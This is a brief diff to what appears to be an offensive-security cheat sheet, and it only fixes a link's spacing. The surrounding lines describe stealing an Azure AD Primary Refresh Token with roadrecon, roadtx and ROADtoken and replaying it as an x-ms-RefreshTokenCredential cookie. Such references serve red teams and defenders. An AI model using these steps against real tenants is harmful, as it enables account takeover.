@@ -322,7 +322,7 @@ MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joine
 * Request a nonce from AAD: `roadrecon auth --prt-init -t <tenant-id>`
 * Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
 * `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
-* Then browse to [login.microsoftonline.com ](login.microsoftonline.com ) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
+* Then browse to [login.microsoftonline.com](login.microsoftonline.com) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
     ```powershell
     Name: x-ms-RefreshTokenCredential
     Value: <Signed JWT>
